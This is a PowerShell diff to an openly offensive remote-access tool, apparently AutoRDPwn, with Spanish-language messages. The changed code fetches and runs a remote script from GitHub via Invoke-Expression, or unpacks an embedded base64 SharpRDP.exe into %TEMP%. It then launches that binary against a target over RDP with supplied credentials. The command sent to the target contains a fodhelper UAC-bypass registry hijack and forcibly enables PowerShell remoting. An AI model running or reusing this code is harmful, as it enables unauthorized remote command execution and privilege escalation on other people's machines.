@@ -355,20 +355,24 @@ function Remove-Exclusions {
         $password = $PlainTextPassword | ConvertTo-SecureString -AsPlainText -Force ; if($PlainTextPassword){ $mem_pass = $PlainTextPassword }
         if(!$PlainTextPassword) { Write-Host ; Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ( $PlainTextPassword ) }
         if(!(Test-RemoteTcp -Computer $computer -Port 3389 -TimeoutMs 2500)){ Write-Host ; Write-Host "[!] El puerto 3389 (RDP) esta cerrado en ${computer}.. SharpRDP necesita el escritorio remoto activo" -ForegroundColor Red ; Get-AttackHint -Computer $computer ; Start-Sleep -milliseconds 3000 ; $input = 'volver' ; continue }
-        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; if ($local){ Import-Module $localpath\Resources\Scripts\Invoke-SharpRDP.ps1 } else {
-        Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1')}
+        Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Blue' ; $srexepath = Join-Path $env:TEMP 'SharpRDP.exe'
+        Get-Process SharpRDP -ErrorAction SilentlyContinue | Stop-Process -Force 2>&1> $null
+        if ($local){ $srb64 = [regex]::Match((Get-Content "$localpath\Resources\Scripts\Invoke-SharpRDP.ps1" -Raw), '"([A-Za-z0-9+/=]{100000,})"').Groups[1].Value
+        try { [IO.File]::WriteAllBytes($srexepath, [Convert]::FromBase64String($srb64)) } catch { $null } }
+        else { try { Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Scripts/Invoke-SharpRDP.ps1') ; Move-Item -Path '.\SharpRDP.exe' -Destination $srexepath -Force } catch { $null } }
+        if(!(Test-Path $srexepath)){ Write-Host "[!] No se pudo preparar SharpRDP.exe en $env:TEMP (bloqueado por antivirus?).. prueba otro ataque" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } else {
         Write-Host "[i] ${computer}: lanzando payload en 1 sola sesion RDP (SharpRDP + auto-elevacion UAC, limite 45s).." -ForegroundColor DarkGray
         $srcommand = "powershell -nop -w h -c `$e='Get-NetConnectionProfile|Set-NetConnectionProfile -NetworkCategory Private;Enable-PSRemoting -Force -SkipNetworkProfileCheck';whoami /groups >> `$env:TEMP\AutoRDPwn-payload.log;`$k='HKCU\Software\Classes\ms-settings\Shell\Open\command';if((whoami /groups) -match 'S-1-16-12288'){iex `$e}else{reg add `$k /v DelegateExecute /f;reg add `$k /d ('powershell -nop -w h -c '+`$e) /f;fodhelper}"
         $srargs = 'computername=' + $computer + ' command="' + $srcommand + '"'
         if($user){ $srargs = 'computername=' + $computer + ' username="' + $user + '" password="' + $PlainTextPassword + '" command="' + $srcommand + '"' }
-        $srpsi = New-Object System.Diagnostics.ProcessStartInfo ; $srpsi.FileName = '.\SharpRDP.exe' ; $srpsi.Arguments = $srargs ; $srpsi.UseShellExecute = $false
+        $srpsi = New-Object System.Diagnostics.ProcessStartInfo ; $srpsi.FileName = $srexepath ; $srpsi.Arguments = $srargs ; $srpsi.UseShellExecute = $false ; $srpsi.WorkingDirectory = $env:TEMP
         try { $srproc = [System.Diagnostics.Process]::Start($srpsi)
         if(!$srproc.WaitForExit(45000)){ $srproc.Kill() ; Write-Host "[!] SharpRDP sin respuesta en ${computer} tras 45s.. cancelado. Prueba otra vez o usa otro ataque" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
         elseif($srproc.ExitCode -eq 0){ Write-Host "[+] Command was executed successfully!" -ForegroundColor Green }
         else { Write-Host "[!] SharpRDP termino con codigo $($srproc.ExitCode)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } }
         catch { Write-Host "[!] No se pudo lanzar SharpRDP: $($_.Exception.Message)" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }
         Write-Host "[i] Si WinRM sigue apagado: en la maquina destino revisa RunMRU (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU) y %TEMP%\AutoRDPwn-payload.log -- ahi se ve el texto exacto que llego al dialogo Ejecutar" -ForegroundColor DarkGray
-        del .\SharpRDP.exe 2>&1> $null }
+        del $srexepath 2>&1> $null }}
         
         'M' { Show-Banner ; if($mem_computer){ Write-Host "[i] Ultimo objetivo: $mem_computer" -ForegroundColor DarkGray }
         Write-Host ; & $question ; Write-Host "$txt8" -ForegroundColor Gray
